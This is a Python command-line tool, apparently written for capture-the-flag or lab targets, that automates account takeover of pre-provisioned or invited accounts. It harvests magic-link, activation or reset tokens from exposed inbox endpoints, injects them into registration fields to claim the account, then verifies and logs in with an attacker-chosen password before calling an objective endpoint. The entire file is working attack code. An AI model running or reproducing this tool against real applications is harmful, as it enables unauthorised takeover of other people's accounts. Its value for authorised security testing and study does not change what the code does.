#!/usr/bin/env python3
"""authquick.py — bounded first-use account-claim and auth-artifact fast track.

Use this when an application has pre-provisioned/invited accounts plus magic-link,
activation, verification, or reset tokens. The helper deliberately tests a live
artifact against registration/claim fields *before* redeeming it through its
intended verification endpoint, preserving the state ordering that first-use bugs
depend on.

All generated auth values are scalar strings. This helper never sends SQL/NoSQL
operators or type-confusion payloads to login, registration, or password fields.

Exit codes: 0 account-claim transition or flag confirmed, 2 inconclusive/no
transition/rate limited, 3 gateway/request circuit breaker, 4 invalid arguments.
"""
import argparse
import hashlib
import json
import os
import re
import sys
import time
from urllib.parse import parse_qs, unquote, urljoin, urlparse

import requests

requests.packages.urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
FLAG_RE = re.compile(
    r'(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,120}\}', re.I)
RATE_LIMIT_RE = re.compile(
    r'(?:too many (?:attempts|requests)|rate.?limit|slow down|try again later)', re.I)
TRANSITION_RE = re.compile(
    r'(?:account (?:claimed|created)|claim(?:ed| successful)|pending(?:=1| verification)?|'
    r'verify your|verification (?:required|sent|pending|successful)|password '
    r'(?:set|created|updated)|/dashboard|welcome)', re.I)
FAILURE_RE = re.compile(
    r'(?:already exists|duplicate|invalid|failed|failure|error|denied|forbidden|unauthoriz|'
    r'not found|expired)', re.I)
SENSITIVE_FIELD_RE = re.compile(r'(?:password|passwd|token|code|secret|credential)', re.I)
GATEWAY_FAILURES = {502, 503, 504}
DEFAULT_INBOX_PATHS = (
    "/api/auth/inbox", "/dev/inbox", "/api/email", "/api/emails", "/mail", "/dev/mail",
)
DEFAULT_TOKEN_FIELDS = (
    "code", "token", "magic_token", "magic", "link", "otp", "activation_code",
    "verification_code", "enrollment_code", "invite_code", "reset_token",
)


class FoundFlag(RuntimeError):
    pass


class Inconclusive(RuntimeError):
    pass


class RateLimited(RuntimeError):
    pass


class CircuitBreak(RuntimeError):
    pass


class BudgetExhausted(RuntimeError):
    pass


def unique(items):
    return list(dict.fromkeys(item for item in items if item))


def parse_pair(item, option):
    if "=" not in item:
        raise ValueError("%s must be KEY=VALUE: %s" % (option, item))
    key, value = item.split("=", 1)
    key = key.strip()
    if not key:
        raise ValueError("%s has an empty key" % option)
    return key, value


def parse_account(item):
    if "=" in item:
        email, name = item.split("=", 1)
    else:
        email, name = item, item.split("@", 1)[0].replace(".", " ").title()
    email, name = email.strip(), name.strip()
    if "@" not in email:
        raise ValueError("--account must be EMAIL or EMAIL=NAME: %s" % item)
    return email, name


def redact_mapping(data):
    if not isinstance(data, dict):
        return data
    return {
        key: "<redacted>" if SENSITIVE_FIELD_RE.search(str(key)) else value
        for key, value in data.items()
    }


def token_fingerprint(token):
    return hashlib.sha256(token.encode()).hexdigest()[:16]


def response_blob(response):
    return "%s\n%s" % (
        response.headers.get("Location", ""), response.text or "")


def response_fingerprint(response):
    return {
        "status": response.status_code,
        "location": response.headers.get("Location", ""),
        "set_cookie": bool(response.headers.get("Set-Cookie")),
        "content_type": (response.headers.get("Content-Type", "").split(";", 1)[0]),
        "length": len(response.content),
        "body_sha256": hashlib.sha256(response.content).hexdigest(),
    }


def response_differs(left, right):
    return response_fingerprint(left) != response_fingerprint(right)


def transition_score(baseline, candidate):
    base, cand = response_fingerprint(baseline), response_fingerprint(candidate)
    base_blob, cand_blob = response_blob(baseline), response_blob(candidate)
    score, reasons = 0, []
    if cand["location"] and cand["location"] != base["location"]:
        score += 3
        reasons.append("Location changed")
    if cand["set_cookie"] and not base["set_cookie"]:
        score += 3
        reasons.append("new session cookie")
    if baseline.status_code >= 400 and 200 <= candidate.status_code < 400:
        score += 2
        reasons.append("error became success/redirect")
    if candidate.status_code != baseline.status_code:
        score += 1
        reasons.append("status changed")
    if TRANSITION_RE.search(cand_blob) and not TRANSITION_RE.search(base_blob):
        score += 3
        reasons.append("account-state language appeared")
    if FAILURE_RE.search(base_blob) and not FAILURE_RE.search(cand_blob):
        score += 2
        reasons.append("baseline failure disappeared")
    if cand["body_sha256"] != base["body_sha256"]:
        score += 1
        reasons.append("body changed")
    return score, reasons


def likely_auth_success(response):
    blob = response_blob(response)
    if FAILURE_RE.search(blob) or response.status_code >= 400:
        return False
    return bool(response.headers.get("Set-Cookie") or TRANSITION_RE.search(blob)
                or 200 <= response.status_code < 300)


def walk_objects(value):
    if isinstance(value, dict):
        yield value
        for child in value.values():
            yield from walk_objects(child)
    elif isinstance(value, list):
        for child in value:
            yield from walk_objects(child)


def strings_in(value):
    if isinstance(value, dict):
        for key, child in value.items():
            if isinstance(child, (str, int, float)):
                yield str(key), str(child)
            else:
                yield from strings_in(child)
    elif isinstance(value, list):
        for child in value:
            yield from strings_in(child)
    elif isinstance(value, (str, int, float)):
        yield "", str(value)


def token_from_text(text):
    for candidate in re.findall(r'https?://[^\s"\'<>]+|/[^\s"\'<>]+', text or ""):
        try:
            query = parse_qs(urlparse(candidate).query)
        except ValueError:
            query = {}
        for key in ("token", "code", "magic_token", "reset_token", "invite_code"):
            if query.get(key):
                return query[key][0]
    match = re.search(
        r'(?:token|code|magic_token|reset_token|invite_code)=([^&\s"\'<>]+)', text or "", re.I)
    return unquote(match.group(1)) if match else None


def extract_artifact(response, email, require_email=True):
    text = response.text or ""
    if require_email and email.lower() not in text.lower():
        return None
    try:
        data = response.json()
    except ValueError:
        return token_from_text(text)

    objects = list(walk_objects(data))
    scoped = [obj for obj in objects
              if email.lower() in json.dumps(obj, ensure_ascii=False).lower()]
    if require_email and not scoped:
        return None
    candidates = scoped or objects
    candidates.sort(key=lambda obj: len(json.dumps(obj, ensure_ascii=False)))
    for obj in candidates:
        for key, value in strings_in(obj):
            if key.lower() in ("token", "code", "magic_token", "reset_token", "invite_code"):
                return value
            found = token_from_text(value)
            if found:
                return found
    return token_from_text(text)


class AuthFastTrack:
    def __init__(self, args, accounts, register_fields, login_fields):
        self.args = args
        self.accounts = accounts
        self.register_fields = register_fields
        self.login_fields = login_fields
        self.session = requests.Session()
        self.headers = {
            "User-Agent": UA,
            "Accept": "application/json, text/plain, text/html, */*",
        }
        for item in args.header:
            if ":" not in item:
                raise ValueError("--header must be 'Name: Value': %s" % item)
            key, value = item.split(":", 1)
            self.headers[key.strip()] = value.strip()
        self.count = 0
        self.flags = []
        self.rate_limited = False
        os.makedirs(args.out, exist_ok=True)
        self.log_path = os.path.join(args.out, "probes.jsonl")
        self.state_path = os.path.join(args.out, "auth-state.json")
        self.state = {
            "base": args.base.rstrip("/"),
            "accounts": {
                email: {"name": name, "state": "reserved-unmodified", "events": []}
                for email, name in accounts
            },
            "artifacts": [],
            "flags": [],
            "probe_count": 0,
        }
        self._save_state()

    def _save_state(self):
        self.state["probe_count"] = self.count
        with open(self.state_path, "w", encoding="utf-8") as fh:
            json.dump(self.state, fh, indent=2, sort_keys=True)
            fh.write("\n")
        try:
            os.chmod(self.state_path, 0o600)
        except OSError:
            pass

    def event(self, email, state, **details):
        account = self.state["accounts"][email]
        account["state"] = state
        account["events"].append({"event": state, **details})
        self._save_state()

    def _record(self, label, method, path, payload, response):
        record = {
            "label": label,
            "method": method,
            "path": path,
            "request": redact_mapping(payload),
        }
        if isinstance(response, Exception):
            record["error"] = repr(response)
        else:
            record.update({
                "status": response.status_code,
                "headers": dict(response.headers),
                "body": (response.text or "")[:8000],
            })
        with open(self.log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record, sort_keys=True) + "\n")

    def send(self, label, method, path, payload=None, query=None):
        if self.count >= self.args.max_probes:
            raise BudgetExhausted("probe budget reached (%d)" % self.args.max_probes)
        if self.count:
            time.sleep(self.args.delay)
        self.count += 1
        method = method.upper()
        url = urljoin(self.args.base.rstrip("/") + "/", path.lstrip("/"))
        kwargs = {
            "headers": self.headers,
            "params": query,
            "timeout": self.args.timeout,
            "allow_redirects": False,
            "verify": False,
        }
        if payload is not None and method not in ("GET", "HEAD"):
            if self.args.encoding == "json":
                kwargs["json"] = payload
            else:
                kwargs["data"] = payload
        try:
            response = self.session.request(method, url, **kwargs)
        except requests.RequestException as exc:
            self._record(label, method, path, payload, exc)
            self._save_state()
            raise CircuitBreak("request failed during %s: %s" % (label, exc))
        self._record(label, method, path, payload, response)
        location = response.headers.get("Location", "-")
        print("[%02d/%02d] %-30s HTTP %d %db Location=%s" % (
            self.count, self.args.max_probes, label,
            response.status_code, len(response.content), location))
        scan = response_blob(response) + "\n" + "\n".join(
            "%s: %s" % item for item in response.headers.items())
        hits = unique(FLAG_RE.findall(scan))
        if hits:
            self.flags.extend(hit for hit in hits if hit not in self.flags)
            self.state["flags"] = list(self.flags)
            self._save_state()
            for hit in hits:
                print("FLAG %s" % hit)
            # The objective is the final request in the chain. Let its caller
            # record objective-reached and mark the artifact consumed before
            # returning; flags in any earlier probe still stop immediately.
            if label == "objective":
                return response
            raise FoundFlag()
        if response.status_code == 429 or RATE_LIMIT_RE.search(scan):
            raise RateLimited("rate limit during %s" % label)
        if response.status_code in GATEWAY_FAILURES:
            raise CircuitBreak("%s returned HTTP %d" % (label, response.status_code))
        self._save_state()
        return response

    def registration_payload(self, email, name):
        payload = dict(self.register_fields)
        if self.args.name_field and name:
            payload[self.args.name_field] = name
        payload[self.args.email_field] = email
        payload[self.args.password_field] = self.args.password
        return payload

    def request_artifact(self, email):
        response = self.send(
            "artifact-request:%s" % email, self.args.request_method,
            self.args.request_path, {self.args.request_field: email})
        token = extract_artifact(response, email, require_email=False)
        if token:
            return token, self.args.request_path
        for path in self.args.inbox_path:
            response = self.send("artifact-inbox:%s" % path, "GET", path)
            token = extract_artifact(response, email, require_email=True)
            if token:
                return token, path
        return None, None

    def candidate_transition(self, email, name, token):
        baseline_payload = self.registration_payload(email, name)
        baseline = self.send(
            "register-baseline:%s" % email, self.args.register_method,
            self.args.register_path, baseline_payload)
        baseline_blob = response_blob(baseline)
        if TRANSITION_RE.search(baseline_blob) and not FAILURE_RE.search(baseline_blob):
            self.event(email, "baseline-changed-state",
                       response=response_fingerprint(baseline))
            raise Inconclusive(
                "registration baseline changed account state; use a known pre-provisioned identity")
        self.event(email, "baseline-existing-account", response=response_fingerprint(baseline))

        differentials = []
        for field in self.args.token_field:
            payload = dict(baseline_payload)
            payload[field] = token
            candidate = self.send(
                "register-field:%s" % field, self.args.register_method,
                self.args.register_path, payload)
            score, reasons = transition_score(baseline, candidate)
            if response_differs(baseline, candidate):
                differentials.append((score, field, reasons, candidate))
                print("    differential field=%s score=%d: %s" % (
                    field, score, ", ".join(reasons) or "response changed"))
            if score >= 4:
                print("POSSIBLE ACCOUNT CLAIM field=%s: %s" % (
                    field, ", ".join(reasons)))
                self.event(email, "claimed-pending", token_field=field,
                           response=response_fingerprint(candidate))
                return field, candidate
        if differentials:
            differentials.sort(key=lambda item: item[0], reverse=True)
            score, field, reasons, _ = differentials[0]
            print("[!] strongest non-winning differential: field=%s score=%d %s" % (
                field, score, ", ".join(reasons)))
        self.event(email, "no-claim-transition")
        return None, None

    def follow_claim(self, email, token):
        if self.args.no_follow:
            return True
        if not self.args.skip_verify:
            if self.args.verify_method == "GET":
                verified = self.send(
                    "verify-claim", "GET", self.args.verify_path,
                    query={self.args.verify_field: token})
            else:
                verified = self.send(
                    "verify-claim", self.args.verify_method, self.args.verify_path,
                    {self.args.verify_field: token})
            if not likely_auth_success(verified):
                self.event(email, "verification-failed",
                           response=response_fingerprint(verified))
                raise Inconclusive("claim transition found, but verification did not succeed")
            self.event(email, "verified", response=response_fingerprint(verified))

        login_payload = dict(self.login_fields)
        login_payload[self.args.email_field] = email
        login_payload[self.args.password_field] = self.args.password
        logged_in = self.send(
            "password-login", self.args.login_method, self.args.login_path, login_payload)
        if not likely_auth_success(logged_in):
            self.event(email, "password-login-failed",
                       response=response_fingerprint(logged_in))
            raise Inconclusive(
                "claim transition found, but attacker-chosen password did not authenticate")
        print("PERSISTENT PASSWORD LOGIN confirmed for %s" % email)
        self.event(email, "password-authenticated",
                   response=response_fingerprint(logged_in))

        if self.args.objective_path:
            objective = self.send(
                "objective", self.args.objective_method, self.args.objective_path)
            self.event(email, "objective-reached",
                       response=response_fingerprint(objective))
        return True

    def run_account(self, email, name):
        print("\n=== reserved identity: %s (%s) ===" % (email, name))
        self.event(email, "artifact-requested")
        token, source = self.request_artifact(email)
        if not token:
            self.event(email, "artifact-not-found")
            print("[-] no scoped auth artifact found for %s" % email)
            return False
        artifact = {
            "kind": "auth-token",
            "account": email,
            "source": source,
            "fingerprint": token_fingerprint(token),
            "consumed": False,
        }
        self.state["artifacts"].append(artifact)
        self.event(email, "artifact-collected", source=source,
                   fingerprint=artifact["fingerprint"])
        print("[+] captured scoped auth artifact from %s (sha256:%s)" % (
            source, artifact["fingerprint"]))
        field, _ = self.candidate_transition(email, name, token)
        if not field:
            return False
        artifact["claim_field"] = field
        self._save_state()
        success = self.follow_claim(email, token)
        artifact["consumed"] = not self.args.no_follow
        self._save_state()
        return success

    def run(self):
        for email, name in self.accounts:
            try:
                if self.run_account(email, name):
                    return True
            except RateLimited as exc:
                self.rate_limited = True
                self.event(email, "rate-limited", detail=str(exc))
                print("[!] UNTESTED %s: %s; rotating identity" % (email, exc))
                continue
        if self.rate_limited:
            raise Inconclusive("all remaining identities were exhausted or rate limited")
        raise Inconclusive("no cross-flow account-claim transition found")


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Test live auth artifacts against first-use account-claim fields")
    parser.add_argument("--base", required=True, help="application base URL")
    parser.add_argument(
        "--account", action="append", required=True, metavar="EMAIL[=NAME]",
        help="known pre-provisioned identity; repeat to provide rotation/reserve identities")
    parser.add_argument("--password", required=True, help="attacker-chosen password to set/test")
    parser.add_argument("--encoding", choices=("form", "json"), default="form")
    parser.add_argument("--request-path", default="/api/auth/magic-link/request")
    parser.add_argument("--request-method", choices=("POST", "PUT", "PATCH"), default="POST")
    parser.add_argument("--request-field", default="email")
    parser.add_argument("--inbox-path", action="append", default=[],
                        help="token inbox/mail endpoint; repeatable")
    parser.add_argument("--register-path", default="/api/auth/register")
    parser.add_argument("--register-method", choices=("POST", "PUT", "PATCH"), default="POST")
    parser.add_argument("--register-field", action="append", default=[], metavar="KEY=VALUE",
                        help="known-valid registration field; repeatable")
    parser.add_argument("--email-field", default="email")
    parser.add_argument("--name-field", default="name")
    parser.add_argument("--password-field", default="password")
    parser.add_argument("--token-field", action="append", default=[],
                        help="candidate cross-flow field; repeatable (defaults to bounded list)")
    parser.add_argument("--verify-path", default="/api/auth/magic-link/verify")
    parser.add_argument("--verify-method", choices=("GET", "POST", "PUT", "PATCH"), default="GET")
    parser.add_argument("--verify-field", default="token")
    parser.add_argument("--skip-verify", action="store_true")
    parser.add_argument("--login-path", default="/api/auth/login")
    parser.add_argument("--login-method", choices=("POST", "PUT", "PATCH"), default="POST")
    parser.add_argument("--login-field", action="append", default=[], metavar="KEY=VALUE",
                        help="additional login field such as next=/dashboard; repeatable")
    parser.add_argument("--objective-path", help="optional authenticated endpoint to call last")
    parser.add_argument("--objective-method", choices=("GET", "POST", "PUT", "PATCH", "DELETE"),
                        default="GET")
    parser.add_argument("--no-follow", action="store_true",
                        help="stop after a strong claim differential without verifying/logging in")
    parser.add_argument("--header", action="append", default=[], help="extra 'Name: Value' header")
    parser.add_argument("--out", default="recon/authquick", help="evidence directory")
    parser.add_argument("--max-probes", type=int, default=30)
    parser.add_argument("--delay", type=float, default=0.15)
    parser.add_argument("--timeout", type=float, default=10.0)
    return parser.parse_args(argv)


def main(argv=None):
    runner = None
    try:
        args = parse_args(argv)
        if args.max_probes < 4:
            raise ValueError("--max-probes must be at least 4")
        if args.delay < 0 or args.timeout <= 0:
            raise ValueError("--delay must be non-negative and --timeout positive")
        args.inbox_path = unique(args.inbox_path or list(DEFAULT_INBOX_PATHS))
        args.token_field = unique(args.token_field or list(DEFAULT_TOKEN_FIELDS))
        accounts = [parse_account(item) for item in args.account]
        register_fields = dict(parse_pair(item, "--register-field")
                               for item in args.register_field)
        login_fields = dict(parse_pair(item, "--login-field") for item in args.login_field)
        runner = AuthFastTrack(args, accounts, register_fields, login_fields)
        runner.run()
        print("[*] completed %d probe(s); evidence: %s" % (runner.count, runner.log_path))
        return 0
    except FoundFlag:
        print("[*] stopped on flag after %d probe(s); evidence: %s" % (
            runner.count, runner.log_path))
        return 0
    except (Inconclusive, RateLimited, BudgetExhausted) as exc:
        print("[!] INCONCLUSIVE: %s" % exc)
        return 2
    except CircuitBreak as exc:
        print("[!] CIRCUIT BREAKER: %s" % exc)
        return 3
    except (ValueError, TypeError) as exc:
        print("[!] invalid arguments: %s" % exc, file=sys.stderr)
        return 4


if __name__ == "__main__":
    sys.exit(main())
